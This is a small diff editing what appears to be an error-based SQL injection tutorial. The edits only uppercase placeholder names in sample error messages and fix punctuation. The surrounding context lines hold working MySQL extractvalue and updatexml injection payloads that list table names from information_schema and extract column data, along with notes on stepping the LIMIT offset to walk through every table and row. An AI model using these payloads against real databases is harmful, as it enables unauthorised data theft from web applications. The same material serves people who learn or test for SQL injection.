@@ -115,7 +115,7 @@ and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tab
 and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)-- -
 
 Output error:
-XPATH SYNTAX ERROR: 'AUX_column1'35
+XPATH SYNTAX ERROR: 'AUX_COLUMN1'35
 
 (NOTE: Replace the number with bigger number to retrieve the other table [limit 0,1]. For example, number 0 will retrieve the 1st table, number 1 will do the 2nd column, number 2 will do the 3nd column and so on:
 
@@ -124,7 +124,7 @@ and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tab
 and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)),null)-- -
 
 Output error:
-XPATH SYNTAX ERROR: 'AUX_column2'35
+XPATH SYNTAX ERROR: 'AUX_COLUMN2'35
 
 
 -------------------------------------------------------------------------------------------------
@@ -148,4 +148,4 @@ Retrieving data:
 and extractvalue(0x0a,concat(0x0a,(select concat(AUX_DATA) from AUX_DB.AUX_COLUMN1 limit 0,1)))
 and updatexml(0x0a,concat(0x0a,(select concat(AUX_DATA) from AUX_DB.AUX_COLUMN1 limit 0,1)))
 
-(NOTE: Replace the number with bigger number to retrieve the other table [limit 0,1]. For example, number 0 will retrieve the 1st data, number 1 will do the 2nd data, number 2 will do the 3nd data and so on:
+(NOTE: Replace the number with bigger number to retrieve the other table [limit 0,1]. For example, number 0 will retrieve the 1st data, number 1 will do the 2nd data, number 2 will do the 3nd data and so on.
